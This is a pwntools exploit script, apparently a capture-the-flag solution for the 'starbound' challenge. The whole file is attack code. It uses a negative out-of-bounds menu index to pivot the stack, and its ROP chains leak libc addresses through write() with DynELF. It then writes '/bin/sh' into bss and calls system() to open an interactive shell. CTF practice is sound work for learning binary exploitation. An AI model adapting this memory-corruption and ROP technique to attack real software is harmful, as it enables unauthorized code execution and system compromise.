#!/usr/bin/env python3
from pwn import *

# p = remote("chall.pwnable.tw", "10202")

elf = ELF("./starbound")
# context.update(binary=elf, log_level="DEBUG")
p = elf.process()
# gdb.attach(
#     p,
#     """
#     b *main+88
#     """,
# )
# b *main+79 # call strtol@plt
gadget = 0x08048E48  #: add esp, 0x1c ; ret
ppp_ret = 0x080494DA  #: pop ebx ; pop esi ; pop edi ; ret

write_got = elf.got["write"]
write_plt = elf.symbols["write"]
read_plt = elf.symbols["read"]
main_addr = elf.symbols["main"]
start_addr = 0x08048BF0


### out-of-bound ###
def leak(address):
    p.sendlineafter(b"> ", b"6")
    p.sendlineafter(b"> ", b"2")
    payload = b""
    payload += p32(gadget)
    # NAME_80580D0
    p.sendlineafter(b"name: ", payload)
    p.sendlineafter(b"> ", b"1")  # => go to main menu
    pl = b""
    pl += b"-33\x00"
    pl += p32(0xDEADBEEF)
    pl += p32(write_plt)
    pl += p32(ppp_ret)
    pl += p32(1)
    pl += p32(address)
    pl += p32(4)
    pl += p32(main_addr)
    p.sendlineafter(b"> ", pl)
    data = p.recv(4)
    log.info("%#x => %s" % (address, (data or b"")))
    return data


# print(leak(write_got))
dynelf = DynELF(leak, elf=ELF("./starbound"))
system_addr = dynelf.lookup("__libc_system", "libc")
log.info("system LIBC address: " + hex(system_addr))
# 0xf7b1e780

print("-----------write /bin/sh to bss--------------")
p.sendlineafter(b"> ", b"6")
p.sendlineafter(b"> ", b"2")
payload = b""
payload += p32(gadget)
# NAME_80580D0
p.sendlineafter(b"name: ", payload)
p.sendlineafter(b"> ", b"1")  # => go to main menu
wr_address = 0x80580E0  # write string "/bin/sh" | char NAME_80580D0[128]
pl1 = b""
pl1 += b"-33\x00"
pl1 += p32(0xDEADBEEF)
pl1 += p32(read_plt)
pl1 += p32(ppp_ret)
pl1 += p32(0)
pl1 += p32(wr_address)
pl1 += p32(8)
pl1 += p32(main_addr)
p.sendlineafter(b"> ", pl1)
sleep(0.1)
p.send(b"/bin/sh\x00")

print("-----------get shell--------------")
p.sendlineafter(b"> ", b"6")
p.sendlineafter(b"> ", b"2")
payload = b""
payload += p32(gadget)
# NAME_80580D0
p.sendlineafter(b"name: ", payload)
p.sendlineafter(b"> ", b"1")  # => go to main menu
pl2 = b""
pl2 += b"-33\x00"
pl2 += p32(0xDEADBEEF)
pl2 += p32(system_addr)
pl2 += p32(start_addr)
pl2 += p32(wr_address)
p.sendlineafter(b"> ", pl2)

p.interactive()
